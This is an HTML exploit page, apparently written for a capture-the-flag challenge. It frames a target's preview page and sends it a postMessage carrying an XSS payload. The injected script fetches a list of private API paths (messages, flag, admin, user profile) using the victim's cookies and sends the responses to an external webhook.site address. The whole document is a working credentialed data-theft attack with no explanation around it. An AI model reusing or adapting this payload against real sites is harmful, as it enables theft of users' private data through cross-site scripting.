<!DOCTYPE html>
<html>
<body>
<iframe id="preview"
  src="https://7fd91044-45d1-4c43-9260-453e7a5ce9a5.offsec.m0lecon.it/preview"
  style="width:100%;height:500px">
</iframe>

<script>
const f = document.getElementById('preview');

f.addEventListener('load', () => {
  f.contentWindow.postMessage({
    html: `<img src=x onerror="
      (async()=>{
        const W='https://webhook.site/e1a822ee-3b01-4417-aa61-3ec13bd0413f';
        let results=[];

        const paths=[
          '/api/messages',
          '/api/messages/1',
          '/api/messages/2',
          '/api/messages/3',
          '/api/messages/4',
          '/api/messages/5',
          '/api/messages/6',
          '/api/messages/7',
          '/api/flag',
          '/flag',
          '/admin',
          '/admin/api/flag',
          '/api/admin',
          '/api/me'
        ];

        for(const p of paths){
          try{
            let r=await fetch(p,{credentials:'include'});
            let t=await r.text();
            results.push({path:p,status:r.status,body:t.slice(0,1500)});
          }catch(e){
            results.push({path:p,error:String(e)});
          }
        }

        await fetch(W+'?data='+encodeURIComponent(JSON.stringify(results)));
      })()
    ">`
  }, '*');
});
</script>
</body>
</html>
